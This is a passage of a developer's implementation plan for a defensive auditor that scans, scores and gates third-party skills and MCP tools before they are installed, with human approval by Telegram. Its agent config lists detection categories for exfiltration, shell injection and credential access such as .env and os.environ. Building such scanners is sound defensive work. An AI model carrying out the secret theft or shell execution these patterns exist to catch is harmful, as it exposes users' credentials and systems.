            category="BLOCKED",
            findings=findings,
            mismatch=False,
            debate_transcript=None,
            approved_by=None,
            source_url=None,
        )
        self.assertIn("test-skill", report)
        self.assertIn("30", report)
        self.assertIn("BLOCKED", report)
        self.assertIn("CRITICAL", report)
        self.assertIn("eval", report)
```

- [ ] **Step 2: Run test to verify it fails**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/test_skill_auditor.py::TestReporter -v
```
Expected: `ImportError`

- [ ] **Step 3: Implement reporter.py**

```python
# scripts/security/reporter.py
#!/usr/bin/env python3
"""
Markdown audit report and daily summary generator.
Writes to ~/openclaw/security/audits/
"""
from __future__ import annotations
import datetime
from pathlib import Path

AUDIT_DIR = Path.home() / "openclaw" / "security" / "audits"


def build_report(
    skill_name: str,
    score: int,
    category: str,
    findings: list,
    mismatch: bool,
    debate_transcript: dict | None,
    approved_by: str | None,
    source_url: str | None,
) -> str:
    """Build markdown report string. Does not write to disk."""
    date_str     = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
    approved_str = approved_by or "pending"

    lines = [
        f"# Security Audit: {skill_name}",
        f"",
        f"**Date:** {date_str}  **Score:** {score}/100  "
        f"**Category:** {category}  **Approved by:** {approved_str}",
        f"",
    ]

    if source_url:
        lines += [f"**Source:** {source_url}", ""]

    lines += ["## Findings", ""]
    if findings:
        lines += ["| Severity | Category | Line | Snippet |",
                  "|---|---|---|---|"]
        for f in findings:
            snippet = f.snippet.replace("|", "\\|")
            lines.append(f"| {f.severity} | {f.category} | {f.line_no} | `{snippet}` |")
    else:
        lines.append("No findings.")

    lines += [""]

    if mismatch:
        lines += [
            "## SKILL.md Capability Check",
            "",
            "⚠ **MISMATCH** — declared capability conflicts with scan findings.",
            "",
        ]

    if debate_transcript:
        lines += ["## Debate Transcript", ""]
        lines += [f"**Defender (Agent A):**\n{debate_transcript.get('defender', '')}",
                  "",
                  f"**Attacker (Agent B):**\n{debate_transcript.get('attacker', '')}",
                  "",
                  f"**Judge (Agent C):**\n{debate_transcript.get('judge', '')}",
                  ""]

    lines += [
        "## Recommendation",
        "",
        {"TRUSTED": "AUTO-APPROVED", "REVIEW": "MANUAL REVIEW REQUIRED",
         "BLOCKED": "BLOCKED — do not install"}.get(category, category),
        "",
    ]

    return "\n".join(lines)


def write_report(skill_name: str, report_content: str) -> Path:
    """Write report to ~/openclaw/security/audits/<skill>-<date>.md. Returns path."""
    AUDIT_DIR.mkdir(parents=True, exist_ok=True)
    date_str = datetime.datetime.utcnow().strftime("%Y-%m-%d")
    path     = AUDIT_DIR / f"{skill_name}-{date_str}.md"
    path.write_text(report_content, encoding="utf-8")
    return path


def write_summary(registry_rows: list[dict]) -> Path:
    """
    Write daily summary to ~/openclaw/security/audits/summary-<date>.md.
    Overwrites any existing summary for today (reflects current registry state).
    """
    AUDIT_DIR.mkdir(parents=True, exist_ok=True)
    date_str = datetime.datetime.utcnow().strftime("%Y-%m-%d")
    path     = AUDIT_DIR / f"summary-{date_str}.md"

    lines = [
        f"# Skill Registry Summary — {date_str}",
        "",
        f"**Total registered:** {len(registry_rows)}",
        "",
        "| Skill | Score | Category | Approved By | Last Verified |",
        "|---|---|---|---|---|",
    ]
    for row in registry_rows:
        lines.append(
            f"| {row['skill_name']} | {row['trust_score']} | {row['category']} "
            f"| {row.get('approved_by') or '—'} | {row.get('last_verified') or '—'} |"
        )

    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return path
```

- [ ] **Step 4: Run test to verify it passes**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/test_skill_auditor.py::TestReporter -v
```
Expected: `PASSED`

- [ ] **Step 5: Commit**

```bash
git add scripts/security/reporter.py scripts/tests/test_skill_auditor.py
git commit -m "feat(security): implement markdown report and daily summary generator"
```

---

## Task 7: Auditor orchestrator

**Files:**
- Create: `scripts/security/auditor.py`

- [ ] **Step 1: Implement auditor.py**

No new unit tests here — auditor is integration-layer code that would require mocking all 5 modules simultaneously. It is tested indirectly when Telegram handlers are exercised.

```python
# scripts/security/auditor.py
#!/usr/bin/env python3
"""
Orchestrator for the skill/MCP security audit pipeline.
Wires scanner → scorer → debate → registry → reporter → notify.
"""
from __future__ import annotations
import json
import os
import datetime
import logging
from dataclasses import dataclass
from pathlib import Path

from security import scanner, scorer, registry, debate, reporter

LOG_FILE = Path.home() / "openclaw" / "logs" / "security-auditor.jsonl"
SKILLS_INCOMING = Path.home() / "openclaw" / "skills" / "incoming"
SKILLS_ACTIVE   = Path.home() / "openclaw" / "skills" / "active"
SKILLS_REJECTED = Path.home() / "openclaw" / "skills" / "rejected"


def _log(event: str, data: dict):
    LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
    entry = json.dumps({"ts": datetime.datetime.utcnow().isoformat(),
                        "event": event, **data})
    with open(LOG_FILE, "a") as f:
        f.write(entry + "\n")


@dataclass
class AuditResult:
    skill_name:  str
    score:       int
    category:    str
    findings:    list
    mismatch:    bool
    debate:      dict | None
    report_path: Path | None
    notification: str


def audit_skill(
    source_path: str,
    skill_name: str | None = None,
    source_url: str | None = None,
    notify_fn=None,
) -> AuditResult:
    """
    Full audit pipeline for a skill file or directory.
    notify_fn: optional callable(message: str) for Telegram DM.
    """
    path = Path(source_path)
    if skill_name is None:
        skill_name = path.stem

    # 1. Scan all .py files
    all_findings = []
    if path.is_file():
        all_findings = scanner.scan(source_path)
    elif path.is_dir():
        for py_file in sorted(path.rglob("*.py")):
            all_findings.extend(scanner.scan(str(py_file)))

    # 2. SKILL.md capability check
    skill_md = path.parent / "SKILL.md" if path.is_file() else path / "SKILL.md"
    caps     = scanner.scan_skill_md_capabilities(str(skill_md))

    # 3. Score
    score_result = scorer.score(all_findings, skill_md_caps=caps, source_url=source_url)
    trust_score  = score_result["score"]
    category     = score_result["category"]
    mismatch     = score_result["mismatch"]

    # 4. Debate (REVIEW only, and only if we have a local file to read)
    debate_result = None
    if category == scorer.REVIEW:
        try:
            code = path.read_text(encoding="utf-8", errors="replace") if path.is_file() \
                   else "\n".join(
                       p.read_text(encoding="utf-8", errors="replace")
                       for p in sorted(path.rglob("*.py"))
                   )
            debate_result = debate.run_debate(code[:6000], all_findings, trust_score)
            if not debate_result["parse_failed"]:
                trust_score = debate_result["adjusted_score"]
                if trust_score >= 80:
                    category = scorer.TRUSTED
                elif trust_score >= 50:
                    category = scorer.REVIEW
                else:
                    category = scorer.BLOCKED
        except Exception as e:
            _log("debate_error", {"skill": skill_name, "error": str(e)})

    # 5. Register
    registry.register(
        skill_name, source_path, trust_score, category,
        all_findings, source_url=source_url,
    )

    # 6. Move file based on category (only for skills in incoming/)
    if path.is_relative_to(SKILLS_INCOMING):
        if category == scorer.TRUSTED:
            SKILLS_ACTIVE.mkdir(parents=True, exist_ok=True)
            path.rename(SKILLS_ACTIVE / path.name)
        elif category == scorer.BLOCKED:
            SKILLS_REJECTED.mkdir(parents=True, exist_ok=True)
            path.rename(SKILLS_REJECTED / path.name)
        # REVIEW: stays in incoming/

    # 7. Write report
    report_content = reporter.build_report(
        skill_name, trust_score, category, all_findings,
        mismatch, debate_result.get("transcript") if debate_result else None,
        approved_by=None, source_url=source_url,
    )
    report_path = reporter.write_report(skill_name, report_content)

    # 8. Build notification
    if category == scorer.TRUSTED:
        msg = f"✅ Skill TRUSTED: {skill_name} (score: {trust_score}/100)"
    elif category == scorer.REVIEW:
        parse_note = " ⚠ debate failed — manual review" if (debate_result and debate_result["parse_failed"]) else ""
        msg = (f"🟡 Skill needs review: {skill_name} (score: {trust_score}/100){parse_note}\n"
               f"Reply /approve {skill_name} or /block {skill_name}")
    else:
        top = all_findings[0].snippet[:60] if all_findings else "multiple issues"
        msg = f"🔴 Skill BLOCKED: {skill_name} (score: {trust_score}/100) — {top}"

    if notify_fn:
        notify_fn(msg)

    _log("audit_complete", {"skill": skill_name, "score": trust_score, "category": category})
    return AuditResult(skill_name, trust_score, category, all_findings,
                       mismatch, debate_result, report_path, msg)


def handle_approval(skill_name: str, notify_fn=None) -> str:
    """
    Jordan approves a REVIEW-held skill.
    Re-verifies SHA256 before moving to active/. Pure DB update (set_approved)
    only runs if hash matches.
    """
    row = registry.get(skill_name)
    if not row:
        return f"Unknown skill: {skill_name}"

    if row["category"] == scorer.BLOCKED:
        return f"{skill_name} is BLOCKED — cannot approve."

    # Re-verify hash before approving
    source_path = row["source_path"]
    live_hash   = registry.compute_hash(source_path)
    if live_hash != row["hash_sha256"]:
        msg = (f"⚠ {skill_name}: file changed since audit. "
               f"Re-run /audit {skill_name} before approving.")
        if notify_fn:
            notify_fn(msg)
        return msg

    # Hash matches — approve and move
    registry.set_approved(skill_name, "jordan")

    src = Path(source_path)
    if src.exists() and src.is_relative_to(SKILLS_INCOMING):
        SKILLS_ACTIVE.mkdir(parents=True, exist_ok=True)
        src.rename(SKILLS_ACTIVE / src.name)

    msg = f"✅ {skill_name} approved by Jordan and moved to active/"
    if notify_fn:
        notify_fn(msg)
    return msg


def handle_block(skill_name: str, notify_fn=None) -> str:
    """Jordan manually blocks a skill."""
    row = registry.get(skill_name)
    if not row:
        return f"Unknown skill: {skill_name}"

    registry.set_approved(skill_name, "blocked")
    # Update category in DB
    with registry._get_conn() as conn:
        conn.execute(
            "UPDATE skill_registry SET category = 'BLOCKED' WHERE skill_name = ?",
            (skill_name,),
        )

    src = Path(row["source_path"])
    if src.exists():
        SKILLS_REJECTED.mkdir(parents=True, exist_ok=True)
        try:
            src.rename(SKILLS_REJECTED / src.name)
        except Exception:
            pass

    msg = f"🔴 {skill_name} blocked by Jordan."
    if notify_fn:
        notify_fn(msg)
    return msg


def scan_incoming(notify_fn=None) -> list[AuditResult]:
    """Scan ~/openclaw/skills/incoming/ for new unregistered files. Called by cron."""
    SKILLS_INCOMING.mkdir(parents=True, exist_ok=True)
    results = []
    for path in sorted(SKILLS_INCOMING.iterdir()):
        if path.suffix not in (".py", ".md") and not path.is_dir():
            continue
        skill_name = path.stem
        if registry.get(skill_name):
            continue  # already registered
        if notify_fn:
            notify_fn(f"🟡 New skill pending audit: {skill_name}")
        result = audit_skill(str(path), skill_name=skill_name, notify_fn=notify_fn)
        results.append(result)
    return results


def verify_all_skills(notify_fn=None) -> list[tuple[str, str]]:
    """Hash-check all registered skills. DM Jordan if any changed."""
    results = registry.verify_all()
    for skill_name, status in results:
        if status == "changed":
            msg = f"🔴 Skill hash changed: {skill_name} — re-auditing now"
            if notify_fn:
                notify_fn(msg)
            row = registry.get(skill_name)
            if row:
                audit_skill(row["source_path"], skill_name=skill_name,
                            source_url=row.get("source_url"), notify_fn=notify_fn)
    return results


def audit_mcp(notify_fn=None) -> list[AuditResult]:
    """
    Scan Claude MCP configurations in ~/.claude/settings.json and
    project-level .claude/settings.json.
    """
    settings_paths = [
        Path.home() / ".claude" / "settings.json",
        Path.cwd() / ".claude" / "settings.json",
    ]
    results = []
    for settings_path in settings_paths:
        if not settings_path.exists():
            continue
        try:
            data = json.loads(settings_path.read_text())
        except (json.JSONDecodeError, OSError) as e:
            _log("audit_mcp_error", {"path": str(settings_path), "error": str(e)})
            continue  # Graceful — no crash, no notification

        mcp_servers = data.get("mcpServers", {})
        for server_name, config in mcp_servers.items():
            skill_name = f"mcp:{server_name}"
            command    = config.get("command", "")
            source_url = config.get("url")

            # Remote MCP (npm or remote URL) — no source to scan
            is_remote = (
                command in ("npx", "uvx", "npm") or
                (source_url and not source_url.startswith("file://"))
            )
            if is_remote:
                registry.register(
                    skill_name, str(settings_path), score=55,
                    category=scorer.REVIEW, findings=[], source_url=source_url,
                )
                msg = (f"🟡 Remote MCP: {server_name} — manual review required. "
                       f"No local source to scan.")
                if notify_fn:
                    notify_fn(msg)
                continue

            # Local MCP — find the script and scan it
            local_path = Path(command) if command else None
            if local_path and local_path.exists():
                result = audit_skill(str(local_path), skill_name=skill_name,
                                     source_url=source_url, notify_fn=notify_fn)
                results.append(result)

    return results
```

- [ ] **Step 2: Run all tests to make sure nothing broke**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/test_skill_auditor.py -v
```
Expected: all `PASSED`

- [ ] **Step 3: Commit**

```bash
git add scripts/security/auditor.py
git commit -m "feat(security): implement audit orchestrator with approval gate, MCP scan, and cron entry points"
```

---

## Task 8: CLI entry point

**Files:**
- Create: `scripts/skill_auditor.py`

- [ ] **Step 1: Implement skill_auditor.py**

```python
#!/usr/bin/env python3
"""
Skill/MCP Security Auditor — CLI entry point.

Usage:
  python3 skill_auditor.py audit <path_or_name>
  python3 skill_auditor.py verify
  python3 skill_auditor.py list
  python3 skill_auditor.py summary
  python3 skill_auditor.py mcp
"""
from __future__ import annotations
import sys
from pathlib import Path

_SCRIPTS = Path(__file__).parent
if str(_SCRIPTS) not in sys.path:
    sys.path.insert(0, str(_SCRIPTS))

from security import auditor, registry, reporter


def _print(msg: str):
    """Pass-through notify_fn for CLI — prints to stdout."""
    print(msg)


def cmd_audit(args: list[str]):
    if not args:
        print("Usage: skill_auditor.py audit <path_or_skill_name>")
        sys.exit(1)
    target = args[0]
    path   = Path(target)
    if not path.exists():
        # Try incoming dir
        path = Path.home() / "openclaw" / "skills" / "incoming" / target
    result = auditor.audit_skill(str(path), notify_fn=_print)
    print(f"\nAudit complete: {result.skill_name} — {result.category} ({result.score}/100)")
    if result.report_path:
        print(f"Report: {result.report_path}")


def cmd_verify():
    results = auditor.verify_all_skills(notify_fn=_print)
    changed = [r for r in results if r[1] == "changed"]
    ok      = [r for r in results if r[1] == "ok"]
    print(f"\nVerified {len(results)} skills: {len(ok)} ok, {len(changed)} changed")


def cmd_list():
    rows = registry.get_all()
    if not rows:
        print("No skills registered.")
        return
    print(f"{'Skill':<30} {'Score':>5}  {'Category':<10}  {'Approved By':<12}  Last Verified")
    print("-" * 85)
    for r in rows:
        print(f"{r['skill_name']:<30} {r['trust_score']:>5}  {r['category']:<10}  "
              f"{r.get('approved_by') or '—':<12}  {r.get('last_verified') or '—'}")


def cmd_summary():
    rows      = registry.get_all()
    out_path  = reporter.write_summary(rows)
    print(f"Summary written to {out_path}")


def cmd_mcp():
    results = auditor.audit_mcp(notify_fn=_print)
    print(f"\nMCP audit complete: {len(results)} local MCPs scanned.")


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(0)

    cmd  = sys.argv[1]
    args = sys.argv[2:]

    dispatch = {
        "audit":   lambda: cmd_audit(args),
        "verify":  cmd_verify,
        "list":    cmd_list,
        "summary": cmd_summary,
        "mcp":     cmd_mcp,
    }

    fn = dispatch.get(cmd)
    if not fn:
        print(f"Unknown command: {cmd}")
        print("Commands: audit, verify, list, summary, mcp")
        sys.exit(1)
    fn()


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: Smoke test the CLI**

```bash
cd ~/openclaw && python3 scripts/skill_auditor.py list
```
Expected: "No skills registered." or a table of rows (if DB already has entries).

- [ ] **Step 3: Commit**

```bash
git add scripts/skill_auditor.py
git commit -m "feat(security): add skill_auditor.py CLI entry point"
```

---

## Task 9: Telegram integration

**Files:**
- Modify: `scripts/telegram-dispatcher.py` — add 4 new handlers, update `/approve` routing

The dispatcher already imports `clawmson_db`, `clawmson_scout`, etc. Add `security.auditor` import and 4 handlers in the same style as existing handlers.

- [ ] **Step 1: Add import to telegram-dispatcher.py**

Find the imports block near the top (after `import clawmson_scout as scout`). Add:

```python
# Security auditor (lazy import to avoid startup cost if module missing)
try:
    import sys as _sys
    from pathlib import Path as _Path
    _sec_path = str(_Path(__file__).parent)
    if _sec_path not in _sys.path:
        _sys.path.insert(0, _sec_path)
    from security import auditor as _security_auditor
    _SECURITY_AVAILABLE = True
except ImportError:
    _SECURITY_AVAILABLE = False
```

- [ ] **Step 2: Add handle_audit_skill, handle_skills_list, handle_skill_block**

Add after `handle_reject_proc` (around line 393):

```python
# ── Security audit handlers ───────────────────────────────────────────────────

def handle_audit_skill(chat_id: str, skill_name_or_path: str):
    if not _SECURITY_AVAILABLE:
        send(chat_id, "Security auditor not available.")
        return
    if not skill_name_or_path:
        send(chat_id, "Usage: /audit <skill_name_or_path>")
        return
    send(chat_id, f"Auditing {skill_name_or_path}...")

    def _notify(msg: str):
        send(chat_id, msg)

    try:
        result = _security_auditor.audit_skill(
            skill_name_or_path, notify_fn=_notify
        )
        send(chat_id, f"Audit complete: {result.skill_name} — {result.category} "
                      f"({result.score}/100)")
    except Exception as e:
        send(chat_id, f"Audit error: {e}")


def handle_skills_list(chat_id: str):
    if not _SECURITY_AVAILABLE:
        send(chat_id, "Security auditor not available.")
        return
    from security import registry as _reg
    rows = _reg.get_all()
    if not rows:
        send(chat_id, "No skills registered.")
        return
    lines = ["Registered skills:"]
    for r in rows:
        lines.append(
            f"• {r['skill_name']}: {r['trust_score']}/100 [{r['category']}] "
            f"approved={r.get('approved_by') or '—'}"
        )
    send(chat_id, "\n".join(lines))


def handle_skill_block(chat_id: str, skill_name: str):
    if not _SECURITY_AVAILABLE:
        send(chat_id, "Security auditor not available.")
        return
    if not skill_name:
        send(chat_id, "Usage: /block <skill_name>")
        return

    def _notify(msg: str):
        send(chat_id, msg)

    result = _security_auditor.handle_block(skill_name, notify_fn=_notify)
    send(chat_id, result)
```

- [ ] **Step 3: Update handle_approve to route skill approvals**

Find the existing `handle_approve` function. Add skill-approval routing at the top of the function body (after the contract_path lookup):

Locate the line `def handle_approve(task_id: str, chat_id: str):` and add this block right after the docstring:

```python
    # Route to skill approval if this looks like a skill name (no build-result found)
    if _SECURITY_AVAILABLE:
        from security import registry as _reg
        if _reg.get(task_id):
            def _notify(msg: str):
                send(chat_id, msg)
            result = _security_auditor.handle_approval(task_id, notify_fn=_notify)
            send(chat_id, result)
            return
```

- [ ] **Step 4: Wire the new /audit, /skills, /block commands into the message handler**

In the `/slash commands` section (around line 530), add before the `/approve` block:

```python
        if lower.startswith("/audit "):
            skill_arg = text[len("/audit "):].strip()
            handle_audit_skill(chat_id, skill_arg)
            return
        if lower == "/skills":
            handle_skills_list(chat_id)
            return
        if lower.startswith("/block "):
            skill_arg = text[len("/block "):].strip()
            handle_skill_block(chat_id, skill_arg)
            return
```

- [ ] **Step 5: Update /help text**

Find `handle_help` and add to the Commands section:

```python
        "/audit <name>    — security audit a skill\n"
        "/skills          — list registered skills with trust scores\n"
        "/block <name>    — manually block a skill\n"
```

- [ ] **Step 6: Run all tests to verify nothing broke**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/ -v
```
Expected: all `PASSED`

- [ ] **Step 7: Commit**

```bash
git add scripts/telegram-dispatcher.py
git commit -m "feat(security): wire /audit, /skills, /block Telegram commands into dispatcher"
```

---

## Task 10: Agent config + directories

**Files:**
- Create: `agents/configs/security-auditor.md`
- Create required directories

- [ ] **Step 1: Create required skill directories**

```bash
mkdir -p ~/openclaw/skills/incoming ~/openclaw/skills/active ~/openclaw/skills/rejected
mkdir -p ~/openclaw/security/audits
```

- [ ] **Step 2: Create agents/configs/security-auditor.md**

```markdown
# Security Auditor Agent

**Role:** Automated security gate for skills and MCP tools loaded into OpenClaw/Clawmson.

**Model:** `qwen3:30b` (debate engine) · `qwen3:32b` (fallback)

**Entry point:** `~/openclaw/scripts/skill_auditor.py`

**Module layout:**
```
scripts/security/
  scanner.py   — static analysis (7 pattern categories, SKILL.md capability check)
  scorer.py    — 0-100 trust score → TRUSTED/REVIEW/BLOCKED
  registry.py  — skill_registry table in ~/.openclaw/clawmson.db
  debate.py    — 3-agent Ollama debate for REVIEW-range skills
  reporter.py  — markdown audit reports
  auditor.py   — orchestrator
```

**Scan patterns:**

| Category | Severity |
|---|---|
| obfuscation (eval/exec/compile/base64) | CRITICAL |
| exfiltration (non-localhost POST/PUT) | CRITICAL |
| shell_injection (os.system, shell=True) | HIGH |
| network (import requests/urllib/httpx) | HIGH |
| credential_access (.env, os.environ, token vars) | MEDIUM |
| filesystem_write (open w, Path.write_*) | MEDIUM |
| dependency_risk (pip install in code) | MEDIUM |

**Trust scoring:**
- Start 100. CRITICAL −35, HIGH −15, MEDIUM −8, SKILL.md mismatch −20.
- Trust bonus +10 for verified `source_url` matching known-good prefix (source_url only — never path).
- TRUSTED ≥80, REVIEW 50–79, BLOCKED <50.

**Skill detection:** On-demand only. Cron scans `~/openclaw/skills/incoming/` daily.

**Directories:**
- `~/openclaw/skills/incoming/` — drop zone (unaudited)
- `~/openclaw/skills/active/` — TRUSTED or Jordan-approved
- `~/openclaw/skills/rejected/` — BLOCKED
- `~/openclaw/security/audits/` — markdown reports

**Telegram commands:**
- `/audit <name>` — run audit
- `/skills` — list registry
- `/approve <name>` — approve REVIEW skill (re-verifies hash before moving to active/)
- `/block <name>` — block a skill

**Cron integration:**
Add to `cron-nightly.sh`:
```bash
python3 ~/openclaw/scripts/skill_auditor.py verify
python3 ~/openclaw/scripts/skill_auditor.py summary
```
Add to daily scan cron:
```bash
python3 ~/openclaw/scripts/skill_auditor.py mcp
```

**Known limitation:** Hash verification runs on daily cron + at approval time. No loader hook at Python import level — deferred to future phase.
```

- [ ] **Step 3: Run full test suite one final time**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/ -v
```
Expected: all `PASSED`

- [ ] **Step 4: Final commit**

```bash
git add agents/configs/security-auditor.md
git commit -m "feat(security): add security-auditor agent config and skill directories"
```
